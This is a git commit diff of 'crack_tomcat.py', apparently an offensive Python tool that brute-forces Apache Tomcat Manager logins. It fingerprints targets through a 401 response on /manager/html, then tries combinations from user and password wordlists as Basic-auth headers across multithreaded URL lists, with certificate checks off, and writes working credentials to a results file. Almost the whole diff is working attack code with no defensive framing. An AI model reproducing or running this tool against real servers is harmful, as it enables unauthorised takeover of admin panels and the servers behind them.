37997b2dc718a9daf66e391a39781d0517eb2ddf
Katsec <47964489+Katsec@users.noreply.github.com>
2022-06-03 23:52:22 +0800

    Update crack_tomcat.py

--- crackTomcat/crack_tomcat.py
+++ crackTomcat/crack_tomcat.py
@@ -16,7 +16,7 @@ logo = '''
  / ___/______ _____/ /__ /_  __/__  __ _  _______ _/ /_
 / /__/ __/ _ `/ __/  '_/  / / / _ \/  ' \/ __/ _ `/ __/
 \___/_/  \_,_/\__/_/\_\__/_/  \___/_/_/_/\__/\_,_/\__/
-                     /___/by_Kat v1.1
+                     /___/by_Kat v1.2
 '''
 
 password_base64 = []
@@ -34,28 +34,52 @@ def multithreading(funcname, filename="url.txt", pools=5):
     pool.wait()
 
 
-def get_cheek_pass():
+def get_check_pass():
     with open("user.txt", "r") as f:
         for name in f:
-            # print(name.strip())
             with open("pass.txt", "r", encoding='ISO-8859-1') as f:
                 for password in f:
-                    # print(password.strip())
                     pass_str = name.strip() + ":" + password.strip()
-                    # print(pass_str)
                     base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
-                    # print(base64_str)
                     password_base64.append(base64_str)
 
 
-def cheek_tomcat(url):
+def fingerprint_sin(url):
+    print("[+] startig tomcat fingerprint check --- ---\n")
+    try:
+        req = requests.get(url + "/manager/html", timeout=5, verify=False)
+        if req.status_code == 401:
+            print("\033[32m[+] Tomcat fingerprints found", url,"\033[0m")
+            get_check_pass()
+            check_tomcat(url)
+        else:
+            print("[+] Tomcat background not found！ --- ---\n")
+    except Exception as f:
+        print("[+] Network exception --- ---\n")
+
+
+def fingerprint_Mu(url):
+    print("[+] startig tomcat fingerprint check --- ---\n")
+    try:
+        req = requests.get(url + "/manager/html", timeout=5, verify=False)
+        if req.status_code == 401:
+            print("\033[32m[+] Tomcat fingerprints found", url,"\033[0m")
+            get_check_pass()
+            check_tomcat(url)
+            multithreading(check_tomcat, args.check_file, 8)
+        else:
+            print("[+] Tomcat background not found！ --- ---\n")
+    except Exception as f:
+        print("[+] Network exception --- ---\n")
+
+
+def check_tomcat(url):
     i = 0
     print("[+] startig tomcat cheek --- ---\n")
     con = int(len(password_base64))
     for basic in password_base64:
         i = i + 1
         print("[+] 正在进行第 {} 组密码暴破## 已完成: {:.2f}%".format(i, i / con), end="\r")
-        # print(basic)
         headers = {
             "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
             "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
@@ -64,13 +88,9 @@ def cheek_tomcat(url):
         }
         try:
             req = requests.get(url + "/manager/html", headers=headers, timeout=5, verify=False)
-            if req.status_code == 404 or req.status_code == 403:
-                print("未发现管理后台或后台Access Denied")
-                break
-            if req.status_code == 200:
-                print("[+] status_code:", req.status_code, "tomcat爆破成功:",
-                      base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
-                # print(headers)
+            if req.status_code == 200 and "/manager" in req.text:
+                print('\033[31m'"[+] status_code:", req.status_code, "tomcat爆破成功:",
+                      base64.b64decode(basic.encode("utf-8")).decode("utf-8"), '\033[0m')
                 with open('result.txt', 'a+') as f:
                     f.write(url + '\n')
                     f.write(base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
@@ -79,7 +99,7 @@ def cheek_tomcat(url):
             else:
                 pass
         except Exception as e:
-            print(e)
+            print("[+] Abnormal blasting process! --- ---\n")
 
 
 if __name__ == "__main__":
@@ -93,8 +113,6 @@ if __name__ == "__main__":
         parser.add_argument('-r', help="url list to file", type=str, dest='check_file')
         args = parser.parse_args()
         if args.check_url:
-            get_cheek_pass()
-            cheek_tomcat(args.check_url)
+            fingerprint_sin(args.check_url)
         if (args.check_file):
-            get_cheek_pass()
-            multithreading(cheek_tomcat, args.check_file, 8)
+            multithreading(fingerprint_Mu, args.check_file, 8)
